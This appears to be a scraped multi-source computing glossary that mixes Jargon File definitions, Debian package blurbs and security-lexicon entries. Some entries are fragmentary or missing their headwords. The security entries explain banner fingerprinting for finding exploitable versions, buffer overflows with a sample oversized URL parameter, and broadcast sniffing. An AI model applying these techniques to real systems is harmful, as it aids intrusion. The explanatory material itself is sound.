>&#13;n.,adj.,vt. [common] To do a task `in background' is to do it whenever foreground matters are not claiming your undivided attention, and `to background' something means to relegate it to a lower priority. "For now, we'll just print a list of nodes and links; I'm working on the graph-printing problem in background." Note that this implies ongoing activity but at a reduced level or in spare time, in contrast to mainstream `back burner' (which connotes benign neglect until some future resumption of activity). Some people prefer to use the term for processing that they have queued up for their unconscious minds (a tack that one can often fruitfully take upon encountering an obstacle in creative work). Compare amp off, slopsucker. Technically, a task running in background is detached from the terminal where it was started (and often running at a lower priority); oppose foreground. Nowadays this term is primarily associated with Unix, but it appears to have been first used in this sense on OS/360.  From Jargon Dictionary

><P
>&#13;n. [now historical] An old-style UUCP electronic-mail address specifying hops to get from some assumed-reachable location to the addressee, so called because each hop is signified by a bang sign. Thus, for example, the path ...!bigsite!foovax!barbox!me directs people to route their mail to machine bigsite (presumably a well-known location accessible to everybody) and from there through the machine foovax to the account of user me on barbox. In the bad old days of not so long ago, before autorouting mailers became commonplace, people often published compound bang addresses using the { } convention (see glob) to give paths from several big machines, in the hopes that one's correspondent might be able to get mail to one of them reliably (example: ...!{seismo, ut-sally, ihnp4}!rice!beta!gamma!me). Bang paths of 8 to 10 hops were not uncommon in 1981. Late-night dial-up UUCP links would cause week-long transmission times. Bang paths were often selected by both transmission time and reliability, as messages would often get lost. See Internet address, the network, and sitename. From Jargon Dictionary

>&#13;Many text-based protocols will issue text banners when you connect to the service. These can usually be used to fingerprint the os or service. Key point: Many banners reveal the exact version of the product. Over time, exploits are found for specific versions of products. Therefore, the intruder can simply lookup the version numbers in a list to find which exploit will work on the system. In the examples below, the version numbers that reveal the service has known exploitable weaknesses are highlighted. Example: The example below is a RedHat Linux box with most the default service enabled. The examples below show only the text-based services that show banners upon connection (in some cases, a little bit of input was provided in order to trigger the banners). Note that this is an older version of Linux; exploits exist for most these services that would allow a hacker to break into this box (most are buffer-overflow exploits). Best practices: It is often recommend (and required in some government areas) to display a banner warning off unauthorized users. It makes the legal case stronger if you can show that the attacker saw a banner that indicated that they were unauthorized. Best practices: All version information should be supressed in the banners. See the product documentation for more information on this. An example on Solaris is to edit the configuration file /etc/default/telnetd and added the line: BANNER="" This will remove the Solaris login banner, making it more difficult for an intruder to determine the type of operating system.

Data can be displayed in BYTE, WORD, or DOUBLE WORD formats. While displaying WORDS or DOUBLE WORDS the data can be displayed in INTEL's or MOTOROLA's byte ordering. Data of any length can be inserted at any point in the file. The source of this data can be the keyboard, another buffer, or a file.

>&#13;/bay't*/, /be't*/ or (Commonwealth) /bee't*/ n. 1. Mostly working, but still under test; usu. used with `in': `in beta'. In the Real World, systems (hardware or software) software often go through two stages of release testing: Alpha (in-house) and Beta (out-house?). Beta releases are generally made to a group of lucky (or unlucky) trusted customers. 2. Anything that is new and experimental. "His girlfriend is in beta" means that he is still testing for compatibility and reserving judgment. 3. Flaky; dubious; suspect (since beta software is notoriously buggy). Historical note: More formally, to beta-test is to test a pre-release (potentially unreliable) version of a piece of software by making it available to selected (or self-selected) customers and users. This term derives from early 1960s terminology for product cycle checkpoints, first used at IBM but later standard throughout the industry. `Alpha Test' was the unit, module, or component test phase; `Beta Test' was initial system test. These themselves came from earlier A- and B-tests for hardware. The A-test was a feasibility and manufacturability evaluation done before any commitment to design and development. The B-test was a demonstration that the engineering model functioned as specified. The C-test (corresponding to today's beta) was the B-test performed on early samples of the production design, and the D test was the C test repeated after the model had been in production a while.

>&#13;n. [from the mainstream meaning and `Binary digIT'] 1. [techspeak] The unit of information; the amount of information obtained by asking a yes-or-no question for which the two outcomes are equally probable. 2. [techspeak] A computational quantity that can take on one of two values, such as true and false or 0 and 1. 3. A mental flag: a reminder that something should be done eventually. "I have a bit set for you." (I haven't seen you for a while, and I'm supposed to tell or ask you something.) 4. More generally, a (possibly incorrect) mental state of belief. "I have a bit set that says that you were the last guy to hack on EMACS." (Meaning "I think you were the last guy to hack on EMACS, and what I am about to say is predicated on this, so please stop me if this isn't true.") "I just need one bit from you" is a polite way of indicating that you intend only a short interruption for a question that can presumably be answered yes or no. A bit is said to be `set' if its value is true or 1, and `reset' or `clear' if its value is false or 0. One speaks of setting and clearing bits. To toggle or `invert' a bit is to change it, either from 0 to 1 or from 1 to 0. See also flag, trit, mode bit. The term `bit' first appeared in print in the computer-science sense in a 1948 paper by information theorist Claude Shannon, and was there credited to the early computer scientist John Tukey (who also seems to have coined the term `software'). Tukey records that `bit' evolved over a lunch table as a handier alternative to `bigit' or `binit', at a conference in the winter of 1943-44. From Jargon Dictionary

>&#13;bit bang
</B
></DT
><DD
><P
>&#13;n. Transmission of data on a serial line, when accomplished by rapidly tweaking a single output bit, in software, at the appropriate times. The technique is a simple loop with eight OUT and SHIFT instruction pairs for each byte. Input is more interesting. And full duplex (doing input and output at the same time) is one way to separate the real hackers from the wannabees. Bit bang was used on certain early models of Prime computers, presumably when UARTs were too expensive, and on archaic Z80 micros with a Zilog PIO but no SIO. In an interesting instance of the cycle of reincarnation, this technique returned to use in the early 1990s on some RISC architectures because it consumes such an infinitesimal part of the processor that it actually makes sense not to have a UART.

>&#13;n. (alt. `bit diddling' or bit twiddling) Term used to describe any of several kinds of low-level programming characterized by manipulation of bit, flag, nybble, and other smaller-than-character-sized pieces of data; these include low-level device control, encryption algorithms, checksum and error-correcting codes, hash functions, some flavors of graphics programming (see bitblt), and assembler/compiler code generation. May connote either tedium or a real technical challenge (more usually the former). "The command decoding for the new tape driver looks pretty solid but the bit-bashing for the control registers still has bugs." See also bit bang, mode bit. From Jargon Dictionary

>&#13;bit bucket
</B
></DT
><DD
><P
>&#13;n. [very common] 1. The universal data sink (originally, the mythical receptacle used to catch bits when they fall off the end of a register during a shift instruction). Discarded, lost, or destroyed data is said to have `gone to the bit bucket'. On Unix, often used for /dev/null. Sometimes amplified as `the Great Bit Bucket in the Sky'. 2. The place where all lost mail and news messages eventually go. The selection is performed according to Finagle's Law; important mail is much more likely to end up in the bit bucket than junk mail, which has an almost 100% probability of getting delivered. Routing to the bit bucket is automatically performed by mail-transfer agents, news systems, and the lower layers of the network. 3. The ideal location for all unwanted mail responses: "Flames about this article to the bit bucket." Such a request is guaranteed to overflow one's mailbox with flames. 4. Excuse for all mail that has not been sent. "I mailed you those figures last week; they must have landed in the bit bucket." Compare black hole. This term is used purely in jest. It is based on the fanciful notion that bits are objects that are not destroyed but only misplaced. This appears to have been a mutation of an earlier term `bit box', about which the same legend was current; old-time hackers also report that trainees used to be told that when the CPU stored bits into memory it was actually pulling them `out of the bit box'. See also chad box. Another variant of this legend has it that, as a consequence of the `parity preservation law', the number of 1 bits that go to the bit bucket must equal the number of 0 bits. Any imbalance results in bits filling up the bit bucket. A qualified computer technician can empty a full bit bucket as part of scheduled maintenance. From Jargon Dictionary

>&#13;A feature rich ircII based IRC client IRC (Internet Relay Chat) provides a way of communicating in real time with people from all over the world. It consists of various separate networks (or "nets") of IRC servers, machines that allow users to connect to IRC. The largest nets are EFnet (the original IRC net, often having more than 32,000 people at once), Undernet, IRCnet, DALnet, NewNet and OPN. Generally, the user (such as you) runs a program (called a "client") to connect to a server on one of the IRC nets. The server relays information to and from other servers on the same net. The ircII program is the first widely used IRC client. IrcII has spawned several other clients in modern times, all of which keep the basic ircII command set and add to it in various more or less useful ways. Blackened is an enhanced ircII based IRC client that offers a variety of features not found in other clients, including commands designed for IRC server operators and administrators.  Normal users also benefit from additional functionality. See also the Official Blackened Website at http://www.blackened.com/blackened/. From Debian 3.0r0 APT

>&#13;v.,n. [techspeak; from `by one's bootstraps'] To load and initialize the operating system on a machine. This usage is no longer jargon (having passed into techspeak) but has given rise to some derivatives that are still jargon. The derivative `reboot' implies that the machine hasn't been down for long, or that the boot is a bounce (sense 4) intended to clear some state of wedgitude. This is sometimes used of human thought processes, as in the following exchange: "You've lost me." "OK, reboot. Here's the theory...." This term is also found in the variants `cold boot' (from power-off condition) and `warm boot' (with the CPU and all devices already powered up, as after a hardware reset or software crash). Another variant: `soft boot', reinitialization of only part of a system, under control of other software still running: "If you're running the mess-dos emulator, control-alt-insert will cause a soft-boot of the emulator, while leaving the rest of the system running." Opposed to this there is `hard boot', which connotes hostility towards or frustration with the machine being booted: "I'll have to hard-boot this losing Sun." "I recommend booting it hard." One often hard-boots by performing a power cycle. Historical note: this term derives from `bootstrap loader', a short program that was read in from cards or paper tape, or toggled in from the front panel switches. This program was always very short (great efforts were expended on making it short in order to minimize the labor and chance of error involved in toggling it in), but was just smart enough to read in a slightly more complex program (usually from a card or paper tape reader), to which it handed control; this program in turn was smart enough to read the application or operating system from a magnetic tape drive or disk drive. Thus, in successive steps, the computer `pulled itself up by its bootstraps' to a useful operating state. Nowadays the bootstrap is usually found in ROM or EPROM, and reads the first stage in from a fixed location on the disk, called the `boot block'. When this program gains control, it is powerful enough to load the actual OS and hand control over to it. From Jargon Dictionary

This would run the virus, which then infected the boot sector on the hard drive. Any further floppies plugged into the system would then be infected by the virus. Countermeasures: I worked at a company with anal anti-virus procedures (anti-virus on all desktops, regular wiping of floppy disks). It was never able to completely free itself from the boot sector virus problem; one of the viruses was never successfully eradicated from the company. My own personal policy is to disconnect the floppies on 90% of the machines, and disable floppy bootup on the remaining machines. From Hacking-Lexicon

At this point, the client shifts to TFTP to download the actual files it will use to boot from. Key point: DHCP is simply an extension on top of bootp. This is important because without an IP address, clients cannot reach bootp servers that reside across routers. Virtually all routers have an extension for bootp forwarding that fixes this issue.

>&#13;The term "broadcast" is generic and is used in many different area. The origin of the term obviously means to cast out broadly, such as a radio broadcast. Subdefinition: Ethernet has broadcast domains, allowing you to partially sniff some data from your neighbors, and possibly subvert it. Typical protocols that can be sniffed and subverted in this manner are: ARP, NetBIOS, MSBROWSE, rwho, bootp/DHCP, SNMP. An Ethernet broadcast address is "FF:FF:FF:FF:FF:FF". Subdefinition: The Internet protocols TCP/IP support a feature known as a directed broadcast, which allows a remote person the ability to send a single packet to an entire subnet. This will then take advantage of the Ethernet broadcast domain once it reaches its destination. Attacks like smurf take advantage of this. A directed broadcast address looks something like 192.0.2.255, where the last integer "255" means "all devices on subnet 192.0.2.x". Subdefinition: The special IP address of "255.255.255.255" is the local broadcast, and causes the packets to be sent to everyone locally, but not across the Internet. From Hacking-Lexicon

>&#13;brute force
</B
></DT
><DD
><P
>&#13;adj. Describes a primitive programming style, one in which the programmer relies on the computer's processing power instead of using his or her own intelligence to simplify the problem, often ignoring problems of scale and applying naive methods suited to small problems directly to large ones. The term can also be used in reference to programming style: brute-force programs are written in a heavyhanded, tedious way, full of repetition and devoid of any elegance or useful abstraction (see also brute force and ignorance). The canonical example of a brute-force algorithm is associated with the `traveling salesman problem' (TSP), a classical NP-hard problem: Suppose a person is in, say, Boston, and wishes to drive to N other cities. In what order should the cities be visited in order to minimize the distance travelled? The brute-force method is to simply generate all possible routes and compare the distances; while guaranteed to work and simple to implement, this algorithm is clearly very stupid in that it considers even obviously absurd routes (like going from Boston to Houston via San Francisco and New York, in that order). For very small N it works well, but it rapidly becomes absurdly inefficient when N increases (for N = 15, there are already 1,307,674,368,000 possible routes to consider, and for N = 1000 -- well, see bignum). Sometimes, unfortunately, there is no better general solution than brute force. See also NP-. A more simple-minded example of brute-force programming is finding the smallest number in a large list by first using an existing program to sort the list in ascending order, and then picking the first number off the front. Whether brute-force programming should actually be considered stupid or not depends on the context; if the problem is not terribly big, the extra CPU time spent on a brute-force solution may cost less than the programmer time it would take to develop a more `intelligent' algorithm. Additionally, a more intelligent algorithm may imply more long-term complexity cost and bug-chasing than are justified by the speed improvement. Ken Thompson, co-inventor of Unix, is reported to have uttered the epigram "When in doubt, use brute force". He probably intended this as a ha ha only serious, but the original Unix kernel's preference for simple, robust, and portable algorithms over brittle `smart' ones does seem to have been a significant factor in the success of that OS. Like so many other tradeoffs in software design, the choice between brute force and complex, finely-tuned cleverness is often a difficult one that requires both engineering savvy and delicate esthetic judgment.

>&#13;Batched SMTP mailer for sendmail and postfix This package adds a new "mailer" named bsmtp to sendmail or postfix, which allows you to use batched SMTP as protocol. BSMTP is used in UUCP environments and allows to transport many mails as a (compressed) batch instead of transporting every single mail. So bsmtp is an alternative to rmail. Special features of this bsmtp package:  - Completely written in C.  - Configurable batch size (automatically sends batch to uux when a    defined size is reached).  - Creates backups of all outgoing batches (and removes them regularly)  - Works with sendmail and postfix.

>&#13;/buh'kee bits/ n. 1. obs. The bits produced by the CONTROL and META shift keys on a SAIL keyboard (octal 200 and 400 respectively), resulting in a 9-bit keyboard character set. The MIT AI TV (Knight) keyboards extended this with TOP and separate left and right CONTROL and META keys, resulting in a 12-bit character set; later, LISP Machines added such keys as SUPER, HYPER, and GREEK (see space-cadet keyboard). 2. By extension, bits associated with `extra' shift keys on any keyboard, e.g., the ALT on an IBM PC or command and option keys on a Macintosh. It has long been rumored that `bucky bits' were named for Buckminster Fuller during a period when he was consulting at Stanford. Actually, bucky bits were invented by Niklaus Wirth when he was at Stanford in 1964-65; he first suggested the idea of an EDIT key to set the 8th bit of an otherwise 7-bit ASCII character). It seems that, unknown to Wirth, certain Stanford hackers had privately nicknamed him `Bucky' after a prominent portion of his dental anatomy, and this nickname transferred to the bit. Bucky-bit commands were used in a number of editors written at Stanford, including most notably TV-EDIT and NLS. The term spread to MIT and CMU early and is now in general use. Ironically, Wirth himself remained unaware of its derivation for nearly 30 years, until GLS dug up this history in early 1993! See double bucky, quadruple bucky. From Jargon Dictionary

><P
>&#13;n. What happens when you try to stuff more data into a buffer (holding area) than it can handle. This problem is commonly exploited by crackers to get arbitrary commands executed by a program running with root permissions. This may be due to a mismatch in the processing rates of the producing and consuming processes (see overrun and firehose syndrome), or because the buffer is simply too small to hold all the data that must accumulate before a piece of it can be processed. For example, in a text-processing tool that crunches a line at a time, a short line buffer can result in lossage as input from a long line overflows the buffer and trashes data beyond it. Good defensive programming would check for overflow on each character and stop accepting data when the buffer is full up. The term is used of and by humans in a metaphorical sense. "What time did I agree to meet you? My buffer must have overflowed." Or "If I answer that phone my buffer is going to overflow." See also spam, overrun screw. From Jargon Dictionary

>&#13;Username: This form limits input to 10 characters; the browser won't let you type more than that because the form was programmed with a maxlength=10 parameter. However, when this form is submitted, it will actually be sent as a URL that looks something like http://www.robertgraham.com/pubs/test.html?username=robert. Lazy programmers know that browsers will never submit more than 10 characters, and write code that will break if the user submits more. As a hacker, you could simply go to the top of your screen and edit the URL to look something like http://www.robertgraham.com/pubs/test.html?username=robertxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx. This may crash the target system or allow you to bypass password checks. A classic attack that inputs too much data. The excess data "overflows" into other areas of memory, frequently allowing an attack into insert executable code along with the input. This allows the atacker to break into the computer. Buffer overflows are one of the most common programming errors, and the ones most likely to slip through quality assurance testing. They are therefore one of the most common ways of breaking into computers. Analogy: Consider two popular bathroom sink designs. One design is a simple sink with a single drain. The other design includes a backup drain near the top of the sink. The first design is easy and often looks better, but suffers from the problem that if the drain is plugged and the water is left running, the sink will overflow all over the bathroom. The second design prevents the sink from overflowing, as the water level can never get past the top drain. Example: Programmers often forget to validate input. They (rightly) believe that a legal username is less than 32 characters long, and (wrongly) reserve more than enough memory for it, typically 200 characters. The assume that nobody will enter in a name longer than 200 characters, and don't verify this. Malicious hackers exploit this condition by purposely entering in user names a 1000 characters long. Key point: This is a classic programming bug that afflicts almost all systems. The average system on the Internet is vulnerable to a well known buffer overflow attack. Many Windows NT servers have IIS services vulnerable to a buffer overflow in ".htr" handler, many Solaris servers have vulnerable RPC services like cmsd, ToolTalk, and statd; many Linux boxes have vulnerable IMAP4, POP3, or FTP services. Key point: Programs written in C are most vulnerable, C++ is somewhat less vulnerable. Programs written in scripting level languages like VisualBasic and Java are generally not vulnerable. The reason is that C requires the programmer to check buffer lengths, but scripting languages generally make these checks whether the programmer wants them or not. Key point: Buffer overflows are usually a Denial-of-Service in that they will crash/hang a service/system. The most interesting ones, however, can cause the system to execute code provided by the hacker as part of the exploit. Defenses: There are a number of ways to avoid buffer-overflows in code: Use programming languages like Java that bounds-check arrays for you. Run code through special compilers that bounds-check for you. Audit code manually Audit code automatically Key point: The NOOP (no operation) machine language instruction for x86 CPUs is 0x90. Buffer overflows often have long strings of these characters when attacking x86 computers (Windows, Linux). Key point: In a successful buffer overflow exploit, hackers force the system to run their own code. Since most network services run as "root" or "administrator", the exploit would give complete control over the machine. For this reason, more and more services are being configured to run with lower privileges. See also: stack frame From Hacking-Lexicon

>&#13;n. An unwanted and unintended property of a program or piece of hardware, esp. one that causes it to malfunction. Antonym of feature. Examples: "There's a bug in the editor: it writes things out backwards." "The system crashed because of a hardware bug." "Fred is a winner, but he has a few bugs" (i.e., Fred is a good guy, but he has a few personality problems). Historical note: Admiral Grace Hopper (an early computing pioneer better known for inventing COBOL) liked to tell a story in which a technician solved a glitch in the Harvard Mark II machine by pulling an actual insect out from between the contacts of one of its relays, and she subsequently promulgated bug in its hackish sense as a joke about the incident (though, as she was careful to admit, she was not there when it happened). For many years the logbook associated with the incident and the actual bug in question (a moth) sat in a display case at the Naval Surface Warfare Center (NSWC). The entire story, with a picture of the logbook and the moth taped into it, is recorded in the "Annals of the History of Computing", Vol. 3, No. 3 (July 1981), pp. 285-286. The text of the log entry (from September 9, 1947), reads "1545 Relay #70 Panel F (moth) in relay. First actual case of bug being found". This wording establishes that the term was already in use at the time in its current specific sense -- and Hopper herself reports that the term `bug' was regularly applied to problems in radar electronics during WWII. Indeed, the use of `bug' to mean an industrial defect was already established in Thomas Edison's time, and a more specific and rather modern use can be found in an electrical handbook from 1896 ("Hawkin's New Catechism of Electricity", Theo. Audel &#38; Co.) which says: "The term `bug' is used to a limited extent to designate any fault or trouble in the connections or working of electric apparatus." It further notes that the term is "said to have originated in quadruplex telegraphy and have been transferred to all electric apparatus." The latter observation may explain a common folk etymology of the term; that it came from telephone company usage, in which "bugs in a telephone cable" were blamed for noisy lines. Though this derivation seems to be mistaken, it may well be a distorted memory of a joke first current among telegraph operators more than a century ago! Or perhaps not a joke. Historians of the field inform us that the term "bug" was regularly used in the early days of telegraphy to refer to a variety of semi-automatic telegraphy keyers that would send a string of dots if you held them down. In fact, the Vibroplex keyers (which were among the most common of this type) even had a graphic of a beetle on them (and still do)! While the ability to send repeated dots automatically was very useful for professional morse code operators, these were also significantly trickier to use than the older manual keyers, and it could take some practice to ensure one didn't introduce extraneous dots into the code by holding the key down a fraction too long. In the hands of an inexperienced operator, a Vibroplex "bug" on the line could mean that a lot of garbled Morse would soon be coming your way. Further, the term "bug" has long been used among radio technicians to describe a device that converts electromagnetic field variations into acoustic signals. It is used to trace radio interference and look for dangerous radio emissions. Radio community usage derives from the roach-like shape of the first versions used by 19th century physicists. The first versions consisted of a coil of wire (roach body), with the two wire ends sticking out and bent back to nearly touch forming a spark gap (roach antennae). The bug is to the radio technician what the stethoscope is to the stereotype medical doctor. This sense is almost certainly ancestral to modern use of "bug" for a covert monitoring device, but may also have contributed to the use of "bug" for the effects of radio interference itself. Actually, use of `bug' in the general sense of a disruptive event goes back to Shakespeare! (Henry VI, part III - Act V, Scene II: King Edward: "So, lie thou there. Die thou; and die our fear; For Warwick was a bug that fear'd us all.") In the first edition of Samuel Johnson's dictionary one meaning of `bug' is "A frightful object; a walking spectre"; this is traced to `bugbear', a Welsh term for a variety of mythological monster which (to complete the circle) has recently been reintroduced into the popular lexicon through fantasy role-playing games. In any case, in jargon the word almost never refers to insects. Here is a plausible conversation that never actually happened: "There is a bug in this ant farm!" "What do you mean? I don't see any ants in it." "That's the bug." A careful discussion of the etymological issues can be found in a paper by Fred R. Shapiro, 1987, "Entomology of the Computer Bug: History and Folklore", American Speech 62(4):376-378. [There has been a widespread myth that the original bug was moved to the Smithsonian, and an earlier version of this entry so asserted. A correspondent who thought to check discovered that the bug was not there. While investigating this in late 1990, your editor discovered that the NSWC still had the bug, but had unsuccessfully tried to get the Smithsonian to accept it -- and that the present curator of their History of American Technology Museum didn't know this and agreed that it would make a worthwhile exhibit. It was moved to the Smithsonian in mid-1991, but due to space and money constraints was not actually exhibited for years afterwards. Thus, the process of investigating the original-computer-bug bug fixed it in an entirely unexpected way, by making the myth true! --ESR]  From Jargon Dictionary

In  capture-the-flag,  each  team  (except rogues) has a team base and each team with  at  least  one player has a team flag.  The object is to capture an enemy team's flag by bringing it  to  your  team's  base.   This destroys  every player on the captured team, subtracts one from that team's score, and adds one to your team's score. In  free-for-all,  there  are no team flags or team bases.

Compression is generally considerably better than that achieved by more conventional LZ77/LZ78-based compressors, and approaches the performance of the PPM family of statistical compressors.

(BCPL was in turn descended from an earlier Algol-derived language, CPL.) Before Bjarne Stroustrup settled the question by designing C++, there was a humorous debate over whether C's successor should be named `D' or `P'. C became immensely popular outside Bell Labs after about 1980 and is now the dominant language in systems and microcomputer applications programming. See also languages of choice, indent style. C is often described, with a mixture of fondness and disdain varying according to the speaker, as "a language that combines all the elegance and power of assembly language with all the readability and maintainability of assembly language".

Now one of the languages of choice, although many hackers still grumble that it is the successor to either Algol 68 or Ada (depending on generation), and a prime example of second-system effect. Almost anything that can be done in any language can be done in C++, but it requires a language lawyer to know what is and what is not legal-- the design is almost too large to hold in even hackers' heads. Much of the cruft results from C++'s attempt to be backward compatible with C. Stroustrup himself has said in his retrospective book "The Design and Evolution of C++" (p. 207), "Within C++, there is a much smaller and cleaner language struggling to get out."

</B

><DD
><P
>&#13;A source code control system is a MUST to manage the changes occurring to a software project during development. Developers need a complete history of changes to backtrack to previous versions in case of any problems. Since source code is the most vital component of any software project and software development takes a huge amount of time and money, it is very important to spend some time in safe-guarding the source code by using source code control systems like CVS and RCS. CVS (Concurrent Version Control System) is a powerful tool which allows concurrent development of software by multiple users. It uses RCS underneath and has an application layer interface as a wrapper on top of RCS. CVS can record the history of your files (usually, but not always, source code). CVS only stores the differences between versions, instead of every version of every file you've created. CVS also keeps a log of who, when and why changes occurred, among other aspects. CVS is very helpful for managing releases and controlling the concurrent editing of source files among multiple authors. Instead of providing version control for a collection of files in a single directory, CVS provides version control for a hierarchical collection of directories consisting of revision controlled files. These directories and files can then be combined to form a software release. CVS can be used for storing "C", "C++", Java, Perl, HTML and other files. HISTORY of CVS: CVS is a very highly sophisticated and complex system. It is the "State of the Art" technology and is so called "software miracle". The CVS software is a very advanced and capable system developed over a very long period of time. And it took several years to mature!! It took about 20 to 30 years of research to develop CVS algorithms and later it was coded into a software. And even today, it is still evolving!! CVS algorithms actually started in Universities several decades ago and CVS implementation started out as a bunch of shell scripts written by Dick Grune, who posted it to the newsgroup comp.sources.unix in the volume 6 release of December, 1986. While no actual code from these shell scripts is present in the current version of CVS much of the CVS conflict resolution algorithms come from them. In April, 1989, Brian Berliner designed and coded CVS. Jeff Polk later helped Brian with the design of the CVS module and vendor branch support. And today each and every major software development project in the world is written using CVS as the safe repository. As good old software hats say - "You are in very safe hands, if you are using CVS !!!" From http://www.milkywaygalaxy.freeservers.com

Depending on the type of Cookie used, and the Browsers' settings, the Browser may accept or not accept the Cookie, and may save the Cookie for either a short time or a long time. Cookies might contain information such as login or registration information, online "shopping cart" information, user preferences, etc. When a Server receives a request from a Browser that includes a Cookie, the Server is able to use the information stored in the Cookie. For example, the Server might customize what is sent back to the user, or keep a log of particular users' requests. Cookies are usually set to expire after a predetermined amount of time and are usually saved in memory until the Browser software is closed down, at which time they may be saved to disk if their "expire time" has not been reached. Cookies do not read your hard drive and send your life story to the CIA, but they can be used to gather more information about a user than would be possible without them. From Matisse

>&#13;The physical drive itself usually comprises several actual disks of which both sides are used. The sides are labelled 0, 1, 2, 3, and so on, and are also called heads because one magnetic head per side does the actual reading and writing. Each side/head has tracks, and each track is divided into segments called sectors. Each sector typically holds 512 bytes. The total amount of space on the drive in bytes is therefore:  512 x (sectors-per-track) x (tracks-per-side) x (number-of-sides)  A single track and all the tracks of the same diameter (on all the sides) are called a cylinder. Disks are normally talked about in terms of ``cylinders and sectors'' instead of ``sides, tracks, and sectors.'' Partitions are (usually) divided along cylinder boundaries. Hence, disks do not have arbitrarily sized partitions; rather, the size of the partition is usually a multiple of the amount of data held in a single cylinder. Partitions therefore have a definite inner and outer diameter. From Rute-Users-Guide

>&#13;In general computer science, the word cache means simply to keep things around in case they are used again. For example, when you log onto your system, your username and password are stored in a cache in memory, because they are repeatedly used by the system every time you access a resource. Key point: Sometimes systems can be exploited through the cache. Examples are: HTTP proxy servers Companies use these so that thousands of users can share a single Internet connection. They store recently used webpages so that when multiple users access the same web-site, the proxy server only has to go across the link once in order to fetch the page for all the users. A never ending series of bugs leads to conditions whereby when one user logs into a website, other users can see that first user's data. Web-browser history/file cache Once a hacker breaks into a machine, he/she can view the history cache (list of URLs) or file cache (the actual contents of the web-sites) in order to spy on where the user has been. Embarrassing, inadvertent disclosure of this information by users with certain surfing habits is common.

By extension, to dump large amounts of data at an unprepared target or with no intention of browsing it carefully. Usage: considered silly. Rare outside Unix sites. See also dd, BLT. Among Unix fans, cat(1) is considered an excellent example of user-interface design, because it delivers the file contents without such verbosity as spacing or headers between the files, and because it does not require the files to consist of lines of text, but works with any sort of data. Among Unix haters, cat(1) is considered the canonical example of bad user-interface design, because of its woefully unobvious name. It is far more often used to blast a file to standard output than to concatenate two files. The name cat for the former operation is just as unintuitive as, say, LISP's cdr. Of such oppositions are holy wars made.... See also UUOC. From Jargon Dictionary

It requires a MySQL database to run. The general idea behind the design of Catalog is that creating a catalog is mainly a matter of organizing objects in a structured tree. For Catalog the objects are records in a table of the SQL database. The structured tree is a set of tree nodes and relations between these nodes. The maintainer of the catalog is in charge of building the tree and placing objects in this tree. Here is a short list of the functions provided by Catalog:  * Display structured trees of resources.  * Display chronologically ordered resources and associated calendar.  * Display alphabetical indexes of resources.  * Allow full text search in the resources and the category names.  * Powerful HTML based administration of catalogs.  * On-Line editing of resource records.  * Handle an arbitrary number of catalogs.  * High performances using mod_perl and Apache.  * Easy customization of the user view using HTML template files.  * It is possible to define more than one view of the same catalog.  * Load and unload a thematic catalog in XML.  * Create an HTML dump of a structured tree to publish a static version.  * Complete documentation including a guide and a reference manual.  * Ready to use example.

The CDcontrol itself has a daily production report for each writter and fails of writting, in cases of more serious errors, a technical report is also written (it's content is a full cdrecord output for that writter, plus the time when it happens). Other interesting feature is the automatic calculation of copies, enabling only the writers requested to complete the number and skipping all that are disabled. The CDcontrol come with the following tools: cd-memoria - Read the CD image and write it on the permanent memory (HD, Raid, CDRW, etc). memoria-cd - Read the CD image and write it on all writers. apagar-cdcontrol - Delete a CD image from permanent memory config-cdcontrol - Allow you to manually enable/disable one or more writers. rel-cdcontrol - Allow you to read the success/fail reports of each day (the technician report is found at the subdirectory $LOG_DIR/tec and should be read as any text file in the system).

It goes something like this (though the details among various programs are different). the client requests access the server sends back random data the client then encrypts/hashes the data using the password the server checks the result In this manner, the client proves it knows the correct password without ever sending it across the wire. Key point: In most cases the user is prompted for the password, which the client then stores in memory. In the use of smart cards, however, the system may give the user the challenge string, which the user then types into the smart card. The smart card then produces a response, which the user must type back into the system. In this way, the user validates that they have the smart card. Key point: Challenge-response systems are thought to be more secure because the challenge/response is different every time.

>&#13;Sound Module Tracking Program (IT - Impulse Tracker Clone) This program is used to create what is called 'Sound Modules', files containing samples of, for instance, piano's and guitars, and a couple of play-patterns with notes, durations and effects. If these patterns are sequenced, a melody will play according to the notes and instruments you set in the pattern. This program is a direct clone of the MSDOS program called Impulse Tracker. It's not hard to learn, and very funny to play around with. This version is only capable of loading .IT type files (the original Impulse Tracker format).

Compiled programs can easily be embedded into existing C code.  - Simple. It can be used as a pedagogical tool for anybody who is    interested in the workings of a compiler.  - Extendable, since its code generation scheme, runtime system, and    garbage collector fit neatly into a C environment.  - Offers better performance than nearly all interpreter based    implementations, but still provides full Scheme semantics.  - Probably is the first implementation of Scheme that uses Henry    Baker's [Cheney on the M.T.A] concept. Usually, you will also need to install the chicken-dev package. The source files are not included since you could easily get them with the Debian source package. If you really feel the needs to get them under /usr/share/chicken/src, then please let me know. There are many Scheme implementations available in Debian, have a look at each of them! Have fun!

><DD
><P
>&#13;In cryptography, the word cipher means an encryption algorithm. A cipher transforms the original data/message into pseudo-random data/message of the same length. In order to decipher the message, a reverse transformation must be applied. Key point: A block cipher is one that encrypts a block of data at a time. For example, DES uses a block size of 64-bits. Each input block must correspond to exactly one output block (like a codebook). A block-cipher suffers from the fact the same data repeated in a message would be encoded in the same way. Consider a block size of 8-bit encrypting English text; you could therefore figure out all the letter 'e's in the cipher text because they are the most common letter used. Therefore, block-ciphers are often used in a chaining mode such that the same pattern will indeed be decrypted differently. Key point: A stream cipher is essentially a chained block cipher with a block size of 1 (either 1-bit or 1-byte). It generates a keystream against which it XORs the plaintext, operating much like a one-time pad, though less secure in theory but more secure in practice. Example: Some popular ciphers are: DES The original widely-used computer-based encryption cipher that spawned the industry, but easily crackable today. triple DES A more secure form of DES whereby data is simply encrypted three different times. RC4 One of the most widely used ciphers today because of its prevalent use within web browsers and SSL. RC2 A cipher similar to RC4. IDEA Gained popularity because it was used as the default cipher for PGP. Blowfish Popular cipher because of its open source and non-patented status. CAST-128 Alternate cipher in PGP. Skipjack Controversal cipher designed for the Clipper chip, a government program to encourage key recovery for law enforcement. GOST 28147 Russian standard with 256-bit key.

It runs on microcomputers (OS/2, Windows NT/2000, Windows 95/98, Amiga 500-4000, Acorn RISC PC) as well as on Unix workstations (Linux, SVR4, Sun4, DEC Alpha OSF, HP-UX, BeOS, NeXTstep, SGI, AIX, Sun3 and others) and needs only 2 MB of RAM. The user interface comes in German, English, French, Spanish and Dutch. GNU CLISP includes an interpreter, a compiler, a large subset of CLOS, a foreign language interface and a socket interface. An X11 interface is available through CLX and Garnet. From Debian 3.0r0 APT

